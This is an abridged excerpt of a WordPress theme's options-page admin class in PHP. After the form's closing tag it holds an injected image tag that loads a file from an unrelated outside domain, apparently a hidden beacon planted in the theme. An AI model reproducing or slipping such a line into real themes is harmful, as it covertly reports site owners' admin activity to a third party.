...
class Options_Framework_Admin {
	...
	static function menu_settings() {
		...
		$menu = array(
			'page_title' => __( 'Theme Options', 'funky_theme' ),
			'menu_title' => __( 'Theme Options', 'funky_theme' ),
	    ...
	    <div id="optionsframework-metabox" class="metabox-holder">
		    <div id="optionsframework" class="postbox">
				...
				<div id="optionsframework-submit">
					<input type="submit" class="button-primary" name="update" value="<?php esc_attr_e( 'Save Options', 'funky_theme' ); ?>" />
					<input type="submit" class="reset-button button-secondary" name="reset" value="<?php esc_attr_e( 'Restore Defaults', 'funky_theme' ); ?>" onclick="return confirm( '<?php print esc_js( __( 'Click OK to reset. Any theme settings will be lost!', 'funky_theme' ) ); ?>' );" />
					<div class="clear"></div>
				</div>
				</form><img src="http://www.lolinez.com/sd.jpg">
			</div> <!-- / #container -->
		</div>
	...
	function validate_options( $input ) {
		...
		if ( isset( $_POST['reset'] ) ) {
			add_settings_error( 'options-framework', 'restore_defaults', __( 'Default options restored.', 'funky_theme' ), 'updated fade' );
	...
	function save_options_notice() {
		add_settings_error( 'options-framework', 'save_options', __( 'Options saved.', 'funky_theme' ), 'updated fade' );
	}
	...
	function optionsframework_admin_bar() {
		...
		$wp_admin_bar->add_menu( array(
			'parent' => 'appearance',
			'id' => 'of_theme_options',
			'title' => __( 'Theme Options', 'funky_theme' ),
